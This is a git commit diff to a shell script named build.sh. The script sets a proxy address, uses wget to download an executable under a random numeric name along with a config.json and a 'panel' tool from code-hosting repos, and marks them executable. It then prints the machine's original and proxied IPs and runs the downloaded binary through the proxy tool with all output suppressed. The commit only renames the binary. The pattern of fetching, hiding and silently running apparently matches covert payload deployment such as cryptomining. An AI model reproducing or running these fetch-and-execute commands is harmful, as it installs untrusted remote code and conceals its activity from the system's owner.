b8b53715708b05abce5c175ea950f47f3002f2ab
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-29 23:17:03 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,6 @@
 proxy="192.252.209.155" 
 port="14455"  
-wget -q -O 1502841365 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x 1502841365
+wget -q -O 6082242663 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x 6082242663
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./1502841365 -c "config.json" >/dev/null 2>&1
+./panel ./6082242663 -c "config.json" >/dev/null 2>&1
